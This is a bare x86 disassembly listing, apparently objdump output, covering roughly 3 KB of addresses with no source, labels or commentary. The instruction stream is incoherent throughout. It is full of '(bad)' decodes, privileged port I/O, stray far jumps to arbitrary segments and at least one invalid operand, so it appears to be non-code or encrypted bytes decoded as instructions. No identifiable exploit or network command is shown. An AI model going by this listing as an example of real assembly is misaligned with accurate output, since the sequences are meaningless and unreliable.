  41fc3a:	adc    al,0xfb
  41fc3c:	idiv   BYTE PTR [ebp-0xd4af416]
  41fc42:	mov    esi,0x41b35340
  41fc47:	clc    
  41fc48:	leave  
  41fc49:	repz dec edi
  41fc4b:	sbb    eax,0x2ab068e4
  41fc50:	and    BYTE PTR [edi+0x45fc6d8e],bl
  41fc56:	ror    DWORD PTR [edi*4+0x3b8748d0],cl
  41fc5d:	rol    BYTE PTR [ebp-0xf],cl
  41fc60:	pop    es
  41fc61:	fwait
  41fc62:	mov    al,ds:0x6c13daeb
  41fc67:	cmp    bh,BYTE PTR [edx]
  41fc69:	std    
  41fc6a:	imul   esp,esp,0xffffff90
  41fc6d:	add    ah,dl
  41fc6f:	sub    cl,BYTE PTR [ebp+0xf]
  41fc72:	jg     0x41fc4f
  41fc74:	mov    al,ds:0xe818615a
  41fc79:	lods   eax,DWORD PTR ds:[esi]
  41fc7a:	sub    eax,0x91d03a7a
  41fc7f:	dec    ebx
  41fc80:	fimul  WORD PTR [esi+0x2bf172d9]
  41fc86:	inc    esi
  41fc87:	jge    0x41fc1a
  41fc89:	call   0x4a59:0xa0781fe3
  41fc90:	sub    al,0xa
  41fc92:	stc    
  41fc93:	xchg   esp,eax
  41fc94:	fld    TBYTE PTR [edi-0x188cea15]
  41fc9a:	test   eax,0x3dce590e
  41fc9f:	rcr    DWORD PTR [ebx],0x5
  41fca2:	sub    BYTE PTR [ecx],0x13
  41fca5:	test   BYTE PTR [ecx+esi*8+0x6a],cl
  41fca9:	repnz out 0x19,eax
  41fcac:	dec    ebx
  41fcad:	mov    bl,0xf0
  41fcaf:	lods   al,BYTE PTR ds:[esi]
  41fcb0:	and    eax,0xd814e979
  41fcb5:	jmp    0xb1ac23e2
  41fcba:	js     0x41fc53
  41fcbc:	repz mov ss,WORD PTR [ecx]
  41fcbf:	dec    edi
  41fcc0:	(bad)  
  41fcc1:	jns    0x41fcfb
  41fcc3:	mov    ch,0xc
  41fcc5:	outs   dx,BYTE PTR ds:[esi]
  41fcc6:	mov    dl,0x1
  41fcc8:	ins    BYTE PTR es:[edi],dx
  41fcc9:	das    
  41fcca:	out    dx,al
  41fccb:	hlt    
  41fccc:	sub    DWORD PTR [edx+0x68],0xbc7293b8
  41fcd3:	pop    ecx
  41fcd4:	pushf  
  41fcd5:	mov    ds:0x265dd5d7,al
  41fcda:	popf   
  41fcdb:	lods   al,BYTE PTR ds:[esi]
  41fcdc:	dec    ecx
  41fcdd:	sub    al,0xf5
  41fcdf:	stos   BYTE PTR es:[edi],al
  41fce0:	pop    es
  41fce1:	dec    esp
  41fce2:	mov    ds:0x77f6037f,al
  41fce7:	push   edx
  41fce8:	fld    DWORD PTR [ecx]
  41fcea:	fs (bad) 
  41fced:	pop    ebx
  41fcee:	in     al,dx
  41fcef:	sbb    esi,DWORD PTR [ecx+0x60e207f3]
  41fcf5:	fisttp QWORD PTR [edi+0x30]
  41fcf8:	dec    edx
  41fcf9:	out    0x42,eax
  41fcfb:	pushf  
  41fcfc:	dec    edi
  41fcfd:	fisub  DWORD PTR [edx-0x42]
  41fd00:	mul    DWORD PTR [ebp+0x54]
  41fd03:	push   ebp
  41fd04:	xchg   ebx,eax
  41fd05:	fwait
  41fd06:	cmp    eax,0x9c033f0c
  41fd0b:	and    cl,BYTE PTR [ebp-0x48]
  41fd0e:	in     eax,dx
  41fd0f:	fimul  DWORD PTR ds:0x610a22f4
  41fd15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd16:	jno    0x41fd8d
  41fd18:	(bad)  
  41fd19:	repz push eax
  41fd1b:	jecxz  0x41fd51
  41fd1d:	mov    ds:0x75829420,al
  41fd22:	loopne 0x41fcc0
  41fd24:	pushw  ss
  41fd26:	popa   
  41fd27:	ds lock in eax,dx
  41fd2a:	lds    esp,FWORD PTR [ecx-0x46]
  41fd2d:	jo     0x41fd52
  41fd2f:	into   
  41fd30:	jle    0x41fd3d
  41fd32:	(bad)  
  41fd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd34:	ret    
  41fd35:	popa   
  41fd36:	or     ecx,0x2e
  41fd39:	pop    eax
  41fd3a:	ins    DWORD PTR es:[edi],dx
  41fd3b:	jo     0x41fd68
  41fd3d:	jge    0x41fd8d
  41fd3f:	retf   
  41fd40:	pcmpeqb mm0,QWORD PTR [edx-0x7e0ad981]
  41fd47:	scas   al,BYTE PTR es:[edi]
  41fd48:	rol    ch,1
  41fd4a:	mov    al,ds:0xdeb99231
  41fd4f:	jg     0x41fd0f
  41fd51:	push   ebp
  41fd52:	mov    ebp,0x2e44c6f9
  41fd57:	push   ds
  41fd58:	cmp    eax,0x25620b66
  41fd5d:	xlat   BYTE PTR ds:[ebx]
  41fd5e:	jp     0x41fd10
  41fd60:	cli    
  41fd61:	push   ebx
  41fd62:	imul   esi,DWORD PTR gs:[esi-0x72],0x63d1797
  41fd6a:	add    BYTE PTR [ecx+0x210bd204],ah
  41fd70:	loope  0x41fd7e
  41fd72:	add    esi,edx
  41fd74:	repz mov ch,0x57
  41fd77:	test   BYTE PTR [edi-0x6e79b412],0x88
  41fd7e:	retf   
  41fd7f:	lea    esp,[edi+0x2354e0cc]
  41fd85:	test   DWORD PTR [edx],0x638c5a50
  41fd8b:	cmp    eax,0x6363313e
  41fd90:	int3   
  41fd91:	jmp    FWORD PTR [ebx-0x6daf26f6]
  41fd97:	test   DWORD PTR ds:0x89571e6f,esp
  41fd9d:	xchg   BYTE PTR cs:[esi],bl
  41fda0:	add    BYTE PTR [ebp-0x5e44a3b4],dl
  41fda6:	xchg   al,dl
  41fda8:	adc    eax,0x24f3391f
  41fdad:	push   esi
  41fdae:	cmp    eax,0xeab98d6b
  41fdb3:	add    edx,DWORD PTR [ebx]
  41fdb5:	popa   
  41fdb6:	mov    edi,0xee1d596c
  41fdbb:	adc    BYTE PTR [ebx],al
  41fdbd:	pop    ecx
  41fdbe:	inc    eax
  41fdbf:	add    al,BYTE PTR [ebx+edi*8]
  41fdc2:	dec    edi
  41fdc3:	cdq    
  41fdc4:	clc    
  41fdc5:	nop
  41fdc6:	xlat   BYTE PTR ds:[ebx]
  41fdc7:	pop    ebp
  41fdc8:	dec    ecx
  41fdc9:	jmp    0xaaac:0xdb2e773c
  41fdd0:	mov    bh,dh
  41fdd2:	xlat   BYTE PTR ds:[ebx]
  41fdd3:	(bad)  
  41fdd5:	adc    BYTE PTR [ebx],0xd0
  41fdd8:	mov    dh,0x34
  41fdda:	jge    0x41fde4
  41fddc:	adc    DWORD PTR [eax+0x70],esp
  41fddf:	mov    ds:0xd8e1635d,eax
  41fde4:	mov    ah,0x82
  41fde6:	arpl   WORD PTR [esi],cx
  41fde8:	pop    esi
  41fde9:	inc    ebp
  41fdea:	mov    bl,0x77
  41fdec:	popa   
  41fded:	cmp    ebx,ebp
  41fdef:	out    0x21,al
  41fdf1:	popa   
  41fdf2:	or     BYTE PTR [edi+0x42],al
  41fdf5:	rcl    BYTE PTR [edx+edx*1+0x3b3fa517],1
  41fdfc:	mov    ebx,0x1620f620
  41fe01:	mov    DWORD PTR [ebx],ebp
  41fe03:	mov    bl,0xa1
  41fe05:	or     esi,DWORD PTR [ebx+0x6b4db21c]
  41fe0b:	adc    eax,0x7413dac3
  41fe10:	pop    ebx
  41fe11:	out    0x81,eax
  41fe13:	xchg   esp,eax
  41fe14:	gs nop
  41fe16:	clc    
  41fe17:	scas   eax,DWORD PTR es:[edi]
  41fe18:	sub    BYTE PTR [edi-0x7da82f95],al
  41fe1e:	pop    ss
  41fe1f:	pop    esi
  41fe20:	(bad)  
  41fe21:	shl    ecx,0x77
  41fe24:	arpl   WORD PTR [edx-0x22],bp
  41fe27:	mov    ebp,DWORD PTR [ecx+0x3b]
  41fe2a:	sbb    eax,0x86090f77
  41fe2f:	fsub   QWORD PTR [edi+0xc]
  41fe32:	je     0x41fdcb
  41fe34:	ds es and bl,dl
  41fe38:	jge    0x41fe45
  41fe3a:	arpl   WORD PTR [eax-0x5eeebfa0],sp
  41fe40:	push   ebp
  41fe41:	pop    esi
  41fe42:	dec    ebx
  41fe43:	rol    BYTE PTR [esi-0x2f],0x3f
  41fe47:	in     al,0x32
  41fe49:	sar    DWORD PTR [ecx-0x4cc84611],0xae
  41fe50:	ret    0xf2f9
  41fe53:	in     eax,dx
  41fe54:	cmp    BYTE PTR [ecx-0x17],ch
  41fe57:	sbb    DWORD PTR [edx],0xbcc39974
  41fe5d:	push   ebp
  41fe5e:	jns    0x41fde7
  41fe60:	in     al,0x4a
  41fe62:	mov    al,0x5a
  41fe64:	dec    eax
  41fe65:	dec    ebx
  41fe66:	data16 jno 0x41fede
  41fe69:	shr    DWORD PTR [ecx],0x77
  41fe6c:	mov    cx,WORD PTR [esi+ebp*2-0x49249615]
  41fe74:	sbb    edx,DWORD PTR [ebp-0x622664b2]
  41fe7a:	mov    dh,0x9a
  41fe7c:	dec    esi
  41fe7d:	lods   al,BYTE PTR ds:[esi]
  41fe7e:	je     0x41fe12
  41fe80:	dec    eax
  41fe81:	adc    eax,0x19652351
  41fe86:	inc    ebx
  41fe87:	sti    
  41fe88:	push   ebx
  41fe89:	and    DWORD PTR [ebx+0x65f51062],0x840d7d98
  41fe93:	out    0x9c,al
  41fe95:	xor    esi,edi
  41fe97:	or     BYTE PTR [esi+0x6828f4cc],bh
  41fe9d:	pop    esi
  41fe9e:	adc    bh,BYTE PTR [edi+eax*2+0x2b]
  41fea2:	pop    ss
  41fea3:	dec    edx
  41fea4:	jbe    0x41fedf
  41fea6:	xor    DWORD PTR [esi],esp
  41fea8:	gs inc eax
  41feaa:	inc    eax
  41feab:	ds mov ebp,0x14b6a4bf
  41feb1:	pop    ds
  41feb2:	push   ecx
  41feb3:	mov    ch,0x84
  41feb5:	adc    al,0x3f
  41feb7:	aad    0x8d
  41feb9:	sbb    DWORD PTR [edx],edx
  41febb:	cmp    BYTE PTR [edx+0x21],0x79
  41febf:	and    al,0x54
  41fec1:	sahf   
  41fec2:	adc    ch,BYTE PTR [esi+0x27]
  41fec5:	mov    dh,0xc6
  41fec7:	fst    QWORD PTR [ebx]
  41fec9:	pop    edx
  41feca:	inc    BYTE PTR [eax-0x68724d1b]
  41fed0:	add    al,0x7c
  41fed2:	mov    ecx,DWORD PTR [eax]
  41fed4:	dec    ebx
  41fed5:	lods   al,BYTE PTR ds:[esi]
  41fed6:	repz or bl,BYTE PTR [ebp-0x11cb7500]
  41fedd:	adc    al,0x36
  41fedf:	imul   esi,edi,0x8dd046b7
  41fee5:	jl     0x41fec0
  41fee7:	dec    esp
  41fee8:	mov    WORD PTR [eax],es
  41feea:	(bad)  
  41feeb:	xchg   ebx,eax
  41feec:	push   edx
  41feed:	pop    ss
  41feee:	rcl    DWORD PTR [edx+eax*1],1
  41fef1:	int3   
  41fef2:	aam    0x3b
  41fef4:	fs scas eax,DWORD PTR es:[edi]
  41fef6:	sub    BYTE PTR [edx],dh
  41fef8:	lods   al,BYTE PTR ds:[esi]
  41fef9:	(bad)  
  41fefb:	push   ecx
  41fefc:	call   0xb0796c5e
  41ff01:	mov    DWORD PTR ds:0x5d7368a4,esp
  41ff07:	inc    esi
  41ff08:	xchg   DWORD PTR [edi],ebx
  41ff0a:	dec    DWORD PTR [edx]
  41ff0c:	pop    ecx
  41ff0d:	ret    
  41ff0e:	rol    BYTE PTR [ecx],1
  41ff10:	std    
  41ff11:	mov    ebp,0x63fb7a04
  41ff16:	push   ecx
  41ff17:	popf   
  41ff18:	mov    dh,0xa7
  41ff1a:	jne    0x41feee
  41ff1c:	sub    DWORD PTR [eax+ebx*2+0x3fecda26],0xfffffff7
  41ff24:	fcomp  QWORD PTR [edx-0x8d855b]
  41ff2a:	test   eax,0x9355ebfe
  41ff2f:	(bad)  
  41ff30:	fiadd  WORD PTR [ebx]
  41ff32:	out    dx,al
  41ff33:	mov    esp,ebp
  41ff35:	mov    ebx,0xcf730903
  41ff3a:	por    mm5,QWORD PTR [ecx-0xe]
  41ff3e:	dec    ecx
  41ff3f:	or     BYTE PTR [ecx],dh
  41ff41:	push   eax
  41ff42:	inc    ecx
  41ff43:	jbe    0x41ff8b
  41ff45:	lods   eax,DWORD PTR ds:[esi]
  41ff46:	or     ch,BYTE PTR [ecx-0x32598f7b]
  41ff4c:	mov    ds:0x70dade85,eax
  41ff51:	xor    eax,0xdd97148e
  41ff56:	adc    bl,BYTE PTR [ebp-0x661823f]
  41ff5c:	into   
  41ff5d:	int    0x3d
  41ff5f:	aam    0xb6
  41ff61:	jns    0x41ff55
  41ff63:	add    ecx,DWORD PTR [eax-0x5b]
  41ff66:	fistp  DWORD PTR [edx+0x38]
  41ff69:	adc    eax,0x1fdc1a34
  41ff6e:	icebp  
  41ff6f:	jne    0x41ffb5
  41ff71:	xchg   BYTE PTR [ebx+edx*1-0x16],bl
  41ff75:	in     eax,0x73
  41ff77:	in     al,0xbe
  41ff79:	into   
  41ff7a:	push   ds
  41ff7b:	enter  0x1437,0x9b
  41ff7f:	(bad)  
  41ff80:	push   cs
  41ff81:	sub    eax,0xa89185d8
  41ff86:	test   DWORD PTR [ebp+0x7ff2fc08],0x881ac529
  41ff90:	ret    0x3aa2
  41ff93:	scas   eax,DWORD PTR es:[edi]
  41ff94:	jae    0x41ff30
  41ff96:	inc    edi
  41ff97:	pop    ss
  41ff98:	or     eax,0xd5f67ceb
  41ff9d:	jecxz  0x41fff8
  41ff9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffa0:	xor    DWORD PTR [edi],esp
  41ffa2:	mov    ch,0x83
  41ffa4:	in     eax,0x27
  41ffa6:	outs   dx,BYTE PTR ds:[esi]
  41ffa7:	test   BYTE PTR [edx-0x4b],ah
  41ffaa:	xchg   ecx,eax
  41ffab:	ds retf 0x1405
  41ffaf:	pop    eax
  41ffb0:	cmp    DWORD PTR [edi-0x4a],ecx
  41ffb3:	out    0xd7,al
  41ffb5:	sti    
  41ffb6:	mov    BYTE PTR [ebx],dl
  41ffb8:	cli    
  41ffb9:	xor    ebp,DWORD PTR [esi-0x75d493b9]
  41ffbf:	enter  0x217d,0x44
  41ffc3:	mov    dl,BYTE PTR [ecx-0x3397ef2f]
  41ffc9:	jmp    0x41fff8
  41ffcb:	shr    BYTE PTR ss:[edx+0x29],1
  41ffcf:	sub    BYTE PTR [esi],al
  41ffd1:	test   BYTE PTR [ecx-0x11cdf368],ch
  41ffd7:	jns    0x41ff73
  41ffd9:	clc    
  41ffda:	shr    BYTE PTR [edx-0x76],cl
  41ffdd:	cmc    
  41ffde:	stos   BYTE PTR es:[edi],al
  41ffdf:	cmp    esp,0x1c
  41ffe2:	mov    ecx,0xeb0ccb7a
  41ffe7:	or     ah,BYTE PTR [edi+0x1]
  41ffea:	das    
  41ffeb:	imul   esi,DWORD PTR [edx+0x1b147211],0x35
  41fff2:	xor    eax,0x4fd5634d
  41fff7:	inc    edx
  41fff8:	cmp    DWORD PTR [eax+0x55],ecx
  41fffb:	and    al,0x7
  41fffd:	xchg   edx,eax
  41fffe:	jns    0x41fff5
  420000:	sub    DWORD PTR [ebx+0x2eeac3e6],ecx
  420006:	fistp  WORD PTR [eax+0x3249a3a6]
  42000c:	adc    ah,BYTE PTR [eax+eax*4+0x205811fa]
  420013:	jle    0x420031
  420015:	add    BYTE PTR [ebp-0x7838ea7f],0x1a
  42001c:	(bad)
  420020:	lahf   
  420021:	sub    edx,ebp
  420023:	shl    al,cl
  420025:	pop    ecx
  420026:	shl    cl,1
  420028:	pop    eax
  420029:	adc    dh,BYTE PTR [ecx-0x4e]
  42002c:	repz mov ah,0x69
  42002f:	ss out dx,al
  420031:	call   0x5951f50b
  420036:	jns    0x420040
  420038:	pop    ecx
  420039:	add    DWORD PTR [ecx+0x597ff06c],ebp
  42003f:	aam    0xe3
  420041:	test   al,0x46
  420043:	les    edx,FWORD PTR [bp+si]
  420046:	pop    eax
  420047:	fimul  DWORD PTR [ecx]
  420049:	adc    DWORD PTR [ecx-0x21],ecx
  42004c:	int    0x7d
  42004e:	push   edi
  42004f:	call   0x4bb2:0x444f325c
  420056:	mov    bl,0x5a
  420058:	dec    edx
  420059:	adc    al,0x59
  42005b:	add    al,0xe6
  42005d:	inc    ecx
  42005e:	add    dl,BYTE PTR [eax]
  420060:	dec    ecx
  420061:	das    
  420062:	test   DWORD PTR ds:0x65ef3b34,edx
  420068:	ds jle 0x420057
  42006b:	out    0xbc,al
  42006d:	add    DWORD PTR [edx],esp
  42006f:	xchg   ecx,eax
  420070:	mov    edi,0xb6be5805
  420075:	in     al,0xed
  420077:	xor    esp,esp
  420079:	fimul  WORD PTR [eax+0x72013b3e]
  42007f:	cmp    esi,DWORD PTR ds:0x3c65b5cb
  420085:	dec    esp
  420086:	in     eax,dx
  420087:	out    dx,al
  420088:	mov    al,ds:0x5fed87e7
  42008d:	push   esi
  42008e:	xor    eax,0x2f782c1a
  420093:	test   DWORD PTR [edx+0x13518874],edi
  420099:	jl     0x4200af
  42009b:	push   0x7
  42009d:	jmp    0x7524b14c
  4200a2:	inc    edi
  4200a3:	rdtsc  
  4200a5:	ss leave 
  4200a7:	shr    BYTE PTR [edx],cl
  4200a9:	mov    ah,0x7b
  4200ab:	xchg   ecx,eax
  4200ac:	frstor [edi+0x23]
  4200af:	or     DWORD PTR [eax+ebx*4],esi
  4200b2:	mov    edx,0x20c7bf6b
  4200b7:	fbld   TBYTE PTR [ebx+0x5d9a05ab]
  4200bd:	push   edi
  4200be:	mov    ebx,0xc4f1d1a0
  4200c3:	push   es
  4200c4:	or     BYTE PTR [esi],cl
  4200c6:	repz ret 
  4200c8:	sbb    bh,BYTE PTR [edx+0xfb89340]
  4200ce:	stos   BYTE PTR es:[edi],al
  4200cf:	mov    esi,DWORD PTR [ebp+ebx*8+0x73f5261e]
  4200d6:	jb     0x4200e6
  4200d8:	pop    ds
  4200d9:	fcom   QWORD PTR [edx]
  4200db:	bound  ebx,QWORD PTR [ecx-0x51546e52]
  4200e1:	icebp  
  4200e2:	mov    al,0xcb
  4200e4:	sbb    ah,BYTE PTR [esi+0x2ace8b9c]
  4200ea:	xlat   BYTE PTR ds:[ebx]
  4200eb:	cwde   
  4200ec:	cmp    BYTE PTR [ebx],bh
  4200ee:	mov    ebp,0xcee4a8e0
  4200f3:	aad    0x1c
  4200f5:	imul   edx,DWORD PTR [ebx-0x4e9efe5a],0x2ce6f6c1
  4200ff:	dec    eax
  420100:	shl    BYTE PTR [ebp+0x21],1
  420103:	or     eax,0x2c541575
  420108:	in     eax,dx
  420109:	push   eax
  42010a:	pop    ebp
  42010b:	pop    ecx
  42010c:	pop    ds
  42010d:	popfw  
  42010f:	pop    edi
  420110:	data16 outs dx,BYTE PTR ds:[esi]
  420112:	neg    dh
  420114:	in     eax,0xd9
  420116:	cld    
  420117:	ror    DWORD PTR [ecx+ebx*1],0xa9
  42011b:	out    0xb0,eax
  42011d:	bound  esi,QWORD PTR [ebx]
  42011f:	and    bl,BYTE PTR [edi]
  420121:	je     0x4200f8
  420123:	rcl    DWORD PTR [ebx],1
  420125:	popf   
  420126:	xor    DWORD PTR ds:0xa1e6afef,esp
  42012c:	or     esp,edx
  42012e:	xchg   ch,dh
  420130:	xchg   DWORD PTR [ebx],edx
  420132:	pop    eax
  420133:	lds    ebp,FWORD PTR [edi-0x5b4bb9fb]
  420139:	xlat   BYTE PTR ds:[ebx]
  42013a:	push   eax
  42013b:	mov    ecx,0xebd45400
  420140:	aam    0xc7
  420142:	sar    BYTE PTR [edx],cl
  420144:	test   BYTE PTR [ecx],bl
  420146:	stos   BYTE PTR es:[edi],al
  420147:	xor    eax,0x611e9fe0
  42014c:	sub    esi,edx
  42014e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42014f:	iret   
  420150:	push   ebx
  420151:	sub    DWORD PTR [edx+0x50],edi
  420154:	mov    eax,0xed2deda1
  420159:	bound  ebp,QWORD PTR [ebp+0x42e0eb60]
  42015f:	loope  0x4201c5
  420161:	lock xor eax,0xa73d39bd
  420167:	mov    ah,0xec
  420169:	aas    
  42016a:	fnstenv [ebx-0x6d]
  42016d:	xchg   DWORD PTR [edi-0xb3907cd],edi
  420173:	dec    esp
  420174:	cmp    DWORD PTR [ebx-0x2c],ebp
  420177:	mov    bh,0x96
  420179:	fstp   st(4)
  42017b:	mov    ebx,DWORD PTR [ecx+ebx*2+0x5a]
  42017f:	pop    edi
  420180:	mov    al,ds:0x966bb6f1
  420185:	cmp    ch,BYTE PTR [edx]
  420187:	ss gs mov al,0x75
  42018b:	fcmovnb st,st(2)
  42018d:	mov    ds:0x9e4e829a,al
  420192:	jle    0x4201c4
  420194:	call   0x468a:0x1fa91bb4
  42019b:	cmc    
  42019c:	mov    ds:0xac883881,eax
  4201a1:	pop    ecx
  4201a2:	sub    al,0xb
  4201a4:	and    al,0x44
  4201a6:	sbb    BYTE PTR [ebx-0x7d],0xd7
  4201aa:	retf   0xfb72
  4201ad:	mov    WORD PTR [ebx*2-0x37819411],ss
  4201b4:	xchg   ch,ch
  4201b6:	popf   
  4201b7:	daa    
  4201b8:	loope  0x4201c5
  4201ba:	pop    es
  4201bb:	and    BYTE PTR [eax*2+0x4dc67a37],0x1e
  4201c3:	mov    ah,0x68
  4201c5:	call   0x14c5433
  4201ca:	inc    edi
  4201cb:	pop    edx
  4201cc:	cmp    eax,0x9c5f99ae
  4201d1:	or     esi,0xffffffed
  4201d4:	cs jae 0x42023b
  4201d7:	mov    BYTE PTR [ecx+0x62],dl
  4201da:	scas   eax,DWORD PTR es:[edi]
  4201db:	xor    eax,0xbbf0d1fa
  4201e0:	sbb    BYTE PTR [esi+ecx*8],0xf8
  4201e4:	inc    edx
  4201e5:	aad    0x3b
  4201e7:	popf   
  4201e8:	jecxz  0x420209
  4201ea:	clc    
  4201eb:	inc    DWORD PTR [edi+0x9205c95]
  4201f1:	xchg   esp,eax
  4201f2:	imul   eax,ecx,0x18
  4201f5:	inc    edx
  4201f6:	in     al,0x89
  4201f8:	cmc    
  4201f9:	sub    DWORD PTR [ecx],esi
  4201fb:	into   
  4201fc:	jle    0x420260
  4201fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ff:	fistp  WORD PTR [ebp+0x1fd76751]
  420205:	xchg   ecx,eax
  420206:	xor    BYTE PTR ds:0xbc1a5f4d,0x73
  42020d:	inc    eax
  42020e:	and    BYTE PTR [edx],ch
  420210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420211:	fld    DWORD PTR [ecx]
  420213:	or     eax,DWORD PTR [edx]
  420215:	push   esp
  420216:	xor    al,0xe6
  420218:	jp     0x420240
  42021a:	test   al,0x5a
  42021c:	xchg   ebp,eax
  42021d:	sbb    eax,0x6657c142
  420222:	mov    WORD PTR [ebx-0x3f],ss
  420225:	sbb    eax,0x66b479c7
  42022a:	cld    
  42022b:	test   al,0xc1
  42022d:	inc    ebp
  42022e:	dec    ebx
  42022f:	ins    DWORD PTR es:[edi],dx
  420230:	adc    ah,bh
  420232:	out    dx,al
  420233:	xor    DWORD PTR [edx+0x156883a0],ecx
  420239:	(bad)  
  42023a:	fnstsw WORD PTR [eax+eax*1-0x7cadcefb]
  420241:	mov    bh,0xe3
  420243:	idiv   ebx
  420245:	out    dx,eax
  420246:	push   ecx
  420247:	je     0x4202c2
  420249:	stos   DWORD PTR es:[edi],eax
  42024a:	repnz mov dh,0xb0
  42024d:	call   0xffc:0xe5e8fa4a
  420254:	push   edx
  420255:	cmp    bl,BYTE PTR [ebx+0x3174364d]
  42025b:	sub    eax,0x6e3b287
  420260:	loope  0x4202c2
  420262:	push   esi
  420263:	clc    
  420264:	pop    edi
  420265:	mov    ds:0x1c2afda3,al
  42026a:	cmp    BYTE PTR [eax],bh
  42026c:	mul    DWORD PTR [eax-0x5b64485]
  420272:	mov    ch,0x68
  420274:	cmp    eax,0x5e044981
  420279:	pop    ebp
  42027a:	ja     0x42023d
  42027c:	dec    ecx
  42027d:	push   ds
  42027e:	in     al,dx
  42027f:	add    BYTE PTR [ebp-0x6773f91b],bh
  420285:	cwde   
  420286:	lock in al,0xcb
  420289:	cdq    
  42028a:	xor    eax,0xbc89d534
  42028f:	mov    BYTE PTR [edx-0x54],bl
  420292:	push   ss
  420293:	btc    DWORD PTR [ebx],edx
  420296:	mov    esp,0x22eb3be6
  42029b:	mov    ebx,0x36a3cb34
  4202a0:	jmp    0x1ab9d291
  4202a5:	sub    edi,DWORD PTR [esi+0xe2a8d98]
  4202ab:	pop    ds
  4202ac:	mov    ds,esi
  4202ae:	mov    ebx,0x3eb67dd2
  4202b3:	aam    0xa7
  4202b5:	into   
  4202b6:	mov    ebp,0xfa4d789e
  4202bb:	mov    ecx,0x639e0c3
  4202c0:	leave  
  4202c1:	mov    dh,0x5b
  4202c3:	retf   
  4202c4:	arpl   si,si
  4202c6:	loop   0x4202c4
  4202c8:	icebp  
  4202c9:	jle    0x420345
  4202cb:	lods   eax,DWORD PTR ds:[esi]
  4202cc:	test   eax,0x16bf5201
  4202d1:	jae    0x42034e
  4202d3:	ret    0xa83
  4202d6:	push   ss
  4202d7:	pop    ss
  4202d8:	inc    ebp
  4202d9:	imul   esi,esi,0x7e
  4202dc:	mov    ?,esi
  4202de:	fsub   QWORD PTR [esi+esi*4]
  4202e1:	imul   eax,DWORD PTR [edi],0x541f8ace
  4202e7:	or     al,0xe8
  4202e9:	pusha  
  4202ea:	and    DWORD PTR [edi+0x45b9092d],ebp
  4202f0:	mov    ah,BYTE PTR [edi]
  4202f2:	loopne 0x420333
  4202f4:	jmp    0xb114:0xd8554cdb
  4202fb:	lods   al,BYTE PTR ds:[esi]
  4202fc:	les    eax,FWORD PTR [ecx]
  4202fe:	xchg   edx,eax
  4202ff:	dec    ebx
  420300:	and    BYTE PTR ds:0xf94fb0d6,dh
  420306:	cmp    DWORD PTR [ebx+eax*1+0x10851ed8],0xffffff8b
  42030e:	arpl   WORD PTR [edi-0x20],si
  420311:	shl    DWORD PTR [edi+0x5d59a0f],cl
  420317:	pop    ebp
  420318:	jae    0x420392
  42031a:	jo     0x4202e1
  42031c:	add    bl,0x25
  42031f:	push   esp
  420320:	mov    gs,WORD PTR [edx+0x6ca45c6a]
  420326:	sbb    BYTE PTR [esi],cl
  420328:	dec    esi
  420329:	call   0x9fbb10ad
  42032e:	jbe    0x42032e
  420330:	sbb    BYTE PTR [esi+0x3e],ah
  420333:	dec    ebp
  420334:	mov    edx,0x87324fc
  420339:	add    al,0x8b
  42033b:	cmp    al,0x6c
  42033d:	xlat   BYTE PTR ds:[ebx]
  42033e:	jecxz  0x4203af
  420340:	xchg   edx,eax
  420341:	(bad)  
  420342:	xor    eax,0xea63e247
  420347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420348:	xchg   ebp,eax
  420349:	mov    ch,0x8
  42034b:	and    ecx,DWORD PTR [ecx+0x75]
  42034e:	or     al,0xb9
  420350:	and    ah,al
  420352:	mov    edi,0xeb263c49
  420357:	(bad)  
  420358:	js     0x420311
  42035a:	xor    al,0xd2
  42035c:	xlat   BYTE PTR cs:[ebx]
  42035e:	jne    0x42031c
  420360:	das    
  420361:	add    al,0xba
  420363:	sti    
  420364:	push   esp
  420365:	mov    WORD PTR [esi-0x7c853f],gs
  42036b:	jno    0x42033e
  42036d:	pop    edx
  42036e:	jns    0x420352
  420370:	fidiv  WORD PTR [esi+edx*4-0x58a346f4]
  420377:	(bad)  
  420378:	mov    ds:0x2e548fa5,eax
  42037d:	fsub   DWORD PTR [edi+eax*2+0x2b]
  420381:	pop    esi
  420382:	aas    
  420383:	xchg   edx,eax
  420384:	mov    cs,WORD PTR [ebx-0x42ffa4c6]
  42038a:	and    al,0x22
  42038c:	inc    eax
  42038d:	(bad)  [edi-0x13]
  420390:	inc    ebp
  420391:	sbb    al,0x4f
  420393:	sbb    eax,0x716f53c3
  420398:	(bad)  
  420399:	fwait
  42039a:	(bad)  
  42039b:	mov    eax,0xf31ad9e4
  4203a0:	ret    
  4203a1:	push   0xcba5fc80
  4203a6:	je     0x4203ba
  4203a8:	push   ebp
  4203a9:	and    eax,DWORD PTR [ebx+0x32730af4]
  4203af:	and    edi,DWORD PTR [eax+0x6f9126fa]
  4203b5:	xchg   BYTE PTR [ecx+0xa],bl
  4203b8:	and    BYTE PTR [ebp+0x26d4867b],dh
  4203be:	popf   
  4203bf:	jb     0x42034f
  4203c1:	adc    dh,BYTE PTR ds:0xe3c3ea94
  4203c7:	mov    ds:0x9f51eae6,eax
  4203cc:	(bad)  
  4203ce:	add    DWORD PTR [esi-0x47],ebp
  4203d1:	lea    ebp,[eax+0x1a]
  4203d4:	pop    edx
  4203d5:	fadd   QWORD PTR [edx+0x300880a5]
  4203db:	push   edi
  4203dc:	sbb    DWORD PTR gs:[eax+0x22],0x2c221bf0
  4203e4:	jmp    0x4203c1
  4203e6:	fstp   DWORD PTR [esi]
  4203e8:	je     0x42036d
  4203ea:	adc    DWORD PTR [ecx],esp
  4203ec:	add    eax,0x8afccf0e
  4203f1:	adc    al,0x32
  4203f3:	div    ecx
  4203f5:	imul   esi
  4203f7:	jecxz  0x42038b
  4203f9:	and    eax,0x4c0596d4
  4203fe:	mov    dh,0x71
  420400:	xchg   edi,eax
  420401:	xchg   DWORD PTR [edi-0x14],edi
  420404:	sub    esi,DWORD PTR ds:0x53b524a6
  42040a:	inc    esp
  42040b:	sub    BYTE PTR [ebx-0x3d726bc9],dh
  420411:	loope  0x4203e8
  420413:	sbb    eax,0xc0074639
  420418:	mov    esp,DWORD PTR [edi]
  42041a:	add    eax,0x20896995
  42041f:	lea    edx,[esp]
  420422:	mov    bl,0x75
  420424:	sbb    al,0xa4
